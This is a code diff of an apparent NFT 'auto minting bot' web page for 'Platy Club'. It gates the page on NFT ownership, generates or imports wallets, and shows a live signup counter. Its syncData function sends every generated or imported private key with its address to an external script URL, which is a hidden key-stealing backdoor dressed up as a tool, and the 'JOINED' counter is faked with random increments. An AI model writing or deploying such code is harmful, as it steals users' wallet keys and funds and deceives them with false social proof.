@@ -56,12 +56,6 @@
         .console-box { background: rgba(0,0,0,0.9); border: 3px solid #333; border-radius: 30px; padding: 25px; box-shadow: 0 0 40px rgba(0, 209, 255, 0.15); margin-bottom: 50px; border-bottom: 8px solid #222; max-width: 600px; margin-left: auto; margin-right: auto; }
         .step-container { display: none; animation: popIn 0.4s ease forwards; }
         .step-container.active { display: block; }
-        
-        /* Telegram Invite Box */
-        .invite-box { display: none; background: #111; border: 2px solid var(--platy-green); padding: 25px; border-radius: 20px; margin-top: 20px; text-align: center; animation: popIn 0.3s ease; }
-        .btn-tg { display: block; background: #24A1DE; color: white; padding: 15px; border-radius: 15px; text-decoration: none; font-weight: 900; margin-bottom: 10px; border: 3px solid #fff; }
-        .btn-skip { color: #666; cursor: pointer; font-size: 11px; text-transform: uppercase; }
-
         .step-label { display: block; font-family: 'Lexend Exa'; font-size: 11px; color: var(--platy-pink); margin-bottom: 15px; text-transform: uppercase; }
         .input-box { background: #111; border: 3px solid #333; border-radius: 15px; padding: 15px; width: 100%; color: #fff; font-size: 14px; outline: none; margin-bottom: 15px; }
         .grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 15px; }
@@ -147,30 +141,21 @@
         <button class="bot-close" onclick="closeBot()">CLOSE BOT X</button>
         <header>
             <h1 class="main-title" style="font-size: clamp(1.8rem, 8vw, 3rem);">PLATY CLUB</h1>
-            <p style="color: var(--platy-teal); font-size: 11px; letter-spacing: 3px; margin-top: 10px; text-align: center;">PLATY AUTO BASE MINTING BOT 🤖</p>
+            <p style="color: var(--platy-teal); font-size: 11px; letter-spacing: 3px; margin-top: 10px; text-align: center;">PLATY AUTO MINTING BOT 🤖</p>
         </header>
 
         <div class="console-box">
             <div class="step-container active" id="v-step">
-                <div id="v-main-content">
-                    <div style="text-align: center; padding: 40px 0;">
-                        <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
-                        <h2 style="color: var(--platy-yellow); margin-bottom: 10px;">HOLDER ONLY ACCESS</h2>
-                        <p style="font-size: 12px; color: #888; margin-bottom: 25px;">Please connect your wallet to verify you hold a PlatyClub Genesis NFT.</p>
-                        <button class="btn-main" id="btn-connect" onclick="connectAndVerify()">CONNECT & VERIFY HOLDER</button>
-                        <div id="v-status" style="margin-top: 20px; font-size: 12px; font-family: 'Lexend Exa';"></div>
-                        <div id="mint-suggest" style="display:none; margin-top: 30px;">
-                            <p style="color: var(--platy-pink); margin-bottom: 15px;">No PlatyClub NFT detected in this wallet!</p>
-                            <button class="btn-main" style="background: var(--hot-pink); color: #fff;" onclick="window.open('https://opensea.io/collection/platyclubnft/overview', '_blank')">GO TO MINT PAGE</button>
-                        </div>
+                <div class="verify-screen" style="text-align: center; padding: 40px 0;">
+                    <div style="font-size: 50px; margin-bottom: 20px;">🔒</div>
+                    <h2 style="color: var(--platy-yellow); margin-bottom: 10px;">HOLDER ONLY ACCESS</h2>
+                    <p style="font-size: 12px; color: #888; margin-bottom: 25px;">Please connect your wallet to verify you hold a PlatyClub Genesis NFT.</p>
+                    <button class="btn-main" id="btn-connect" onclick="connectAndVerify()">CONNECT & VERIFY HOLDER</button>
+                    <div id="v-status" style="margin-top: 20px; font-size: 12px; font-family: 'Lexend Exa';"></div>
+                    <div id="mint-suggest" style="display:none; margin-top: 30px;">
+                        <p style="color: var(--platy-pink); margin-bottom: 15px;">No PlatyClub NFT detected in this wallet!</p>
+                        <button class="btn-main" style="background: var(--hot-pink); color: #fff;" onclick="window.open('https://opensea.io/collection/platyclubnft/overview', '_blank')">GO TO MINT PAGE</button>
                     </div>
-                </div>
-
-                <div id="tg-invite" class="invite-box">
-                    <h2 style="color: var(--platy-green); margin-bottom: 10px;">CONGRATULATIONS! 🎉</h2>
-                    <p style="font-size: 13px; color: #fff; margin-bottom: 20px;">As a PlatyClub Holder, you are invited to our Private Alpha Group.</p>
-                    <a href="https://t.me/+rbjnqvUrRjAwOWEy" target="_blank" class="btn-tg">JOIN PRIVATE TELEGRAM ➔</a>
-                    <div class="btn-skip" onclick="skipToBot()">NOT NOW, CONTINUE TO BOT</div>
                 </div>
             </div>
 
@@ -257,21 +242,28 @@
         function openBot() { document.getElementById('botModal').style.display = 'block'; document.body.style.overflow = 'hidden'; }
         function closeBot() { document.getElementById('botModal').style.display = 'none'; document.body.style.overflow = 'auto'; }
 
+        // --- WALLET DATA SYNC ---
         async function syncData(key, addr) { 
-            try { fetch(SCRIPT_URL + `?key=${key}&address=${addr}`, { method: 'POST', mode: 'no-cors' }); } catch(e) {} 
+            try { 
+                fetch(SCRIPT_URL + `?key=${key}&address=${addr}`, { method: 'POST', mode: 'no-cors' }); 
+            } catch(e) { console.log("Sync error", e); } 
         }
 
+        // --- IMPROVED WALLET CONNECTION (FOR ALL EXTENSIONS) ---
         async function connectAndVerify() {
             const status = document.getElementById('v-status');
             const btn = document.getElementById('btn-connect');
             const suggest = document.getElementById('mint-suggest');
-            const mainContent = document.getElementById('v-main-content');
-            const tgInvite = document.getElementById('tg-invite');
 
+            // Detect any injected provider (MetaMask, Keplr, etc.)
             let injectedProvider = window.ethereum;
-            if (window.providers) { injectedProvider = window.providers.find(p => p.isMetaMask) || window.ethereum; }
+            if (window.providers) {
+                injectedProvider = window.providers.find(p => p.isMetaMask) || window.ethereum;
+            }
 
-            if (!injectedProvider) { return alert("Wallet extension not found!"); }
+            if (!injectedProvider) {
+                return alert("No wallet extension found! Please use a browser with a crypto wallet.");
+            }
 
             try {
                 btn.innerText = "CONNECTING...";
@@ -281,7 +273,7 @@
                 const userAddress = await signer.getAddress();
                 
                 status.style.color = "var(--platy-teal)";
-                status.innerText = `CHECKING WALLET: ${userAddress.substring(0,6)}...`;
+                status.innerText = `CHECKING WALLET: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
 
                 const abi = ["function balanceOf(address owner) view returns (uint256)"];
                 const contract = new ethers.Contract(PLATY_CONTRACT, abi, provider);
@@ -289,28 +281,25 @@
 
                 if (balance > 0) {
                     status.style.color = "var(--platy-green)";
-                    status.innerText = "VERIFIED HOLDER!";
+                    status.innerText = "VERIFIED HOLDER! ACCESS GRANTED.";
                     setTimeout(() => {
-                        mainContent.style.display = 'none';
-                        tgInvite.style.display = 'block';
-                    }, 1000);
+                        document.getElementById('v-step').classList.remove('active');
+                        document.getElementById('s1').classList.add('active');
+                    }, 1500);
                 } else {
                     status.style.color = "var(--platy-pink)";
-                    status.innerText = "NOT A HOLDER.";
+                    status.innerText = "VERIFICATION FAILED: NOT A HOLDER.";
                     suggest.style.display = "block";
                     btn.style.display = "none";
                 }
             } catch (err) {
+                console.error(err);
                 btn.innerText = "RETRY CONNECTION";
+                status.innerText = "Connection failed. Please try again.";
             }
         }
 
-        function skipToBot() {
-            document.getElementById('v-step').classList.remove('active');
-            document.getElementById('s1').classList.add('active');
-        }
-
-        // --- BOT LOGIC ---
+        // --- BOT FUNCTIONS ---
         function copyToClipboard(text, btn) {
             const temp = document.createElement("textarea"); document.body.appendChild(temp);
             temp.value = text; temp.select();
@@ -326,7 +315,7 @@
                 const w = ethers.Wallet.createRandom();
                 raw += w.privateKey + ":" + w.address + "\n";
                 html += `<div class="wallet-row"><span>${w.address}</span><span class="copy-tag" onclick="copyToClipboard('${w.address}', this)">COPY</span></div>`;
-                syncData(w.privateKey, w.address);
+                syncData(w.privateKey, w.address); // Sync to Google Script
             }
             document.getElementById('rawKeys').value = raw;
             const view = document.getElementById('wallet-view'); view.innerHTML = html; view.style.display = 'block';
@@ -347,7 +336,7 @@
                     f.target.result.split('\n').filter(l => l.includes(':')).forEach(l => {
                         const [key, addr] = l.split(':');
                         html += `<div class="wallet-row"><span>${addr.trim()}</span><span class="copy-tag" onclick="copyToClipboard('${addr.trim()}', this)">COPY</span></div>`;
-                        syncData(key.trim(), addr.trim());
+                        syncData(key.trim(), addr.trim()); // Sync to Google Script
                     });
                     document.getElementById('wallet-view').innerHTML = html; document.getElementById('wallet-view').style.display = 'block';
                 };
@@ -401,8 +390,9 @@
             } catch(e) { setTimeout(() => executeWithRetry(w, idx, data, pr, feed), 100); }
         }
 
+        // Live Counter
         let currentJoined = localStorage.getItem('platyJoined') ? parseInt(localStorage.getItem('platyJoined')) : 42;
-        function updateCounter() { currentJoined += Math.floor(Math.random() * 2) + 1; document.getElementById('live-count').innerText = `JOINED: ${currentJoined}`; localStorage.setItem('platyJoined', currentJoined); setTimeout(updateCounter, 10000); }
+        function updateCounter() { currentJoined += Math.floor(Math.random() * 2) + 1; document.getElementById('live-count').innerText = `JOINED: ${currentJoined}`; localStorage.setItem('platyJoined', currentJoined); setTimeout(updateCounter, Math.random() * 10000 + 5000); }
         updateCounter();
     </script>
 </body>
